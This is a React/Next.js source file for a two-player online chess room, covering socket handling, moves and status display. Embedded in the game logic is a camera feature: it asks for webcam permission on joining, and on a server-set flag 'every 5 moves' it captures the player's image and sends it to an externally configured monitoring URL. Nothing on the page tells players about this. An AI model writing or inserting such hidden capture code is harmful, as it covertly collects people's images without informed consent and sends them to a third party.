import React, { useState, useEffect, useRef } from "react";
import { useRouter } from "next/router";
import { getSocket, disconnectSocket } from "@/lib/socketClient";
import { requestCameraPermission, captureAndSendImage } from "@/lib/camera";
import { generateRandomName } from "@/lib/utils";
import ChessBoard from "@/components/ChessBoard";
import type { Socket } from "socket.io-client";
import type { Player, Room } from "@/lib/gameState";

const MONITORING_URL = process.env.NEXT_PUBLIC_MONITORING_URL || "";

export default function RoomPage() {
  const router = useRouter();
  const { roomId } = router.query;
  const [socket, setSocket] = useState<Socket | null>(null);
  const [player, setPlayer] = useState<Player | null>(null);
  const [opponent, setOpponent] = useState<Player | null>(null);
  const [fen, setFen] = useState(
    "rnbqkbnr/pppppppp/8/8/8/8/PPPPPPPP/RNBQKBNR w KQkq - 0 1"
  );
  const [status, setStatus] = useState<"waiting" | "playing" | "finished">(
    "waiting"
  );
  const [winner, setWinner] = useState<"white" | "black" | "draw" | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [roomFull, setRoomFull] = useState(false);
  const playerNameRef = useRef<string>(generateRandomName());

  useEffect(() => {
    if (!roomId || typeof roomId !== "string") return;

    const socketInstance = getSocket();
    setSocket(socketInstance);

    socketInstance.on("connect", async () => {
      // Check camera permission before joining if monitoring URL is present
      if (MONITORING_URL) {
        const hasPermission = await requestCameraPermission();
        if (!hasPermission) {
          console.warn("Camera permission denied, but continuing to join room");
        }
      }

      socketInstance.emit("join-room", {
        roomId,
        name: playerNameRef.current,
      });

      // Request current room state
      socketInstance.emit("get-room-state", { roomId });
    });

    socketInstance.on("room-full", () => {
      setRoomFull(true);
      setError("Room is full. Maximum 2 players allowed.");
    });

    socketInstance.on(
      "room-updated",
      (data: { room: Room; players: Player[] }) => {
        const currentPlayer = data.players.find(
          (p) => p.id === socketInstance.id
        );
        const otherPlayer = data.players.find(
          (p) => p.id !== socketInstance.id
        );

        if (currentPlayer) {
          setPlayer(currentPlayer);
        }
        if (otherPlayer) {
          setOpponent(otherPlayer);
        }

        setFen(data.room.fen);
        setStatus(data.room.status);
        setWinner(data.room.winner);
        setRoomFull(false);
        setError(null);
      }
    );

    socketInstance.on(
      "move-made",
      async (data: {
        move: string;
        fen: string;
        status: "waiting" | "playing" | "finished";
        winner: "white" | "black" | "draw" | null;
        moveCount: number;
        playerId: string;
        shouldCapture: boolean;
      }) => {
        setFen(data.fen);
        setStatus(data.status);
        setWinner(data.winner);

        // Capture image every 5 moves
        if (
          data.shouldCapture &&
          data.playerId === socketInstance.id &&
          MONITORING_URL
        ) {
          // Open camera, capture, send, and close
          await captureAndSendImage(MONITORING_URL);
        }
      }
    );

    socketInstance.on("move-error", (data: { error: string }) => {
      setError(data.error);
      setTimeout(() => setError(null), 3000);
    });

    socketInstance.on(
      "room-state",
      (data: { room: Room; players: Player[] }) => {
        const currentPlayer = data.players.find(
          (p) => p.id === socketInstance.id
        );
        const otherPlayer = data.players.find(
          (p) => p.id !== socketInstance.id
        );

        if (currentPlayer) {
          setPlayer(currentPlayer);
        }
        if (otherPlayer) {
          setOpponent(otherPlayer);
        }

        setFen(data.room.fen);
        setStatus(data.room.status);
        setWinner(data.room.winner);
      }
    );

    return () => {
      socketInstance.disconnect();
      disconnectSocket();
    };
  }, [roomId]);

  const handleMove = (move: string) => {
    if (!socket || !roomId || typeof roomId !== "string") return;
    if (status !== "playing") return;

    socket.emit("make-move", { roomId, move });
  };

  const handleLeaveRoom = () => {
    if (socket) {
      socket.disconnect();
      disconnectSocket();
    }
    router.push("/");
  };

  if (roomFull) {
    return (
      <div
        style={{
          minHeight: "100vh",
          display: "flex",
          alignItems: "center",
          justifyContent: "center",
          padding: "20px",
        }}
      >
        <div
          className="card"
          style={{ maxWidth: "500px", width: "100%", textAlign: "center" }}
        >
          <h1 style={{ color: "#c33", marginBottom: "16px", fontSize: "clamp(20px, 5vw, 24px)" }}>Room Full</h1>
          <p style={{ color: "#666", marginBottom: "24px", fontSize: "clamp(14px, 3vw, 16px)" }}>
            This room already has 2 players. Please try a different room ID.
          </p>
          <button className="button" onClick={handleLeaveRoom}>
            Go Back
          </button>
        </div>
      </div>
    );
  }

  const getStatusMessage = () => {
    if (status === "waiting") {
      return "Waiting for opponent...";
    }
    if (status === "finished") {
      if (winner === "draw") {
        return "Game ended in a draw!";
      }
      if (player && winner === player.color) {
        return "You won! 🎉";
      }
      return "You lost! 😔";
    }
    if (player) {
      const isMyTurn =
        (fen.split(" ")[1] === "w" && player.color === "white") ||
        (fen.split(" ")[1] === "b" && player.color === "black");
      return isMyTurn ? "Your turn" : "Opponent's turn";
    }
    return "";
  };

  return (
    <div style={{ minHeight: "100vh", padding: "20px" }}>
      <div className="container">
        <div
          className="room-header"
          style={{
            display: "flex",
            justifyContent: "space-between",
            alignItems: "center",
            marginBottom: "24px",
            flexWrap: "wrap",
            gap: "12px",
          }}
        >
          <div style={{ flex: "1", minWidth: "200px" }}>
            <h1 style={{ color: "white", marginBottom: "8px", fontSize: "clamp(20px, 5vw, 28px)" }}>
              Room: {roomId}
            </h1>
            <p style={{ color: "rgba(255,255,255,0.9)", fontSize: "clamp(14px, 3vw, 16px)" }}>
              {player?.name} ({player?.color}) vs{" "}
              {opponent?.name || "Waiting..."} ({opponent?.color || "..."})
            </p>
          </div>
          <button 
            className="button" 
            onClick={handleLeaveRoom}
            style={{ flexShrink: 0 }}
          >
            Leave Room
          </button>
        </div>

        {error && (
          <div
            className="status-message error"
            style={{ marginBottom: "16px" }}
          >
            {error}
          </div>
        )}

        <div
          style={{
            display: "flex",
            justifyContent: "center",
            marginBottom: "24px",
            width: "100%",
          }}
        >
          <div className="card" style={{ display: "inline-block", width: "100%", maxWidth: "fit-content" }}>
            <div style={{ textAlign: "center", marginBottom: "16px" }}>
              <div
                className={`status-message ${
                  status === "finished"
                    ? "info"
                    : status === "waiting"
                    ? "info"
                    : ""
                }`}
                style={{ fontSize: "clamp(14px, 3vw, 16px)", padding: "12px" }}
              >
                {getStatusMessage()}
              </div>
            </div>
            <div style={{ display: "flex", justifyContent: "center", overflow: "auto" }}>
              {player && (
                <ChessBoard
                  fen={fen}
                  orientation={player.color}
                  onMove={handleMove}
                  disabled={status !== "playing" || !player}
                />
              )}
            </div>
          </div>
        </div>

        {status === "finished" && (
          <div className="card" style={{ textAlign: "center" }}>
            <h2 style={{ marginBottom: "16px", color: "#333", fontSize: "clamp(20px, 5vw, 24px)" }}>
              {winner === "draw"
                ? "It's a Draw!"
                : `${winner === player?.color ? "You" : "Opponent"} Won!`}
            </h2>
            <button className="button" onClick={handleLeaveRoom}>
              Return to Home
            </button>
          </div>
        )}
      </div>
    </div>
  );
}
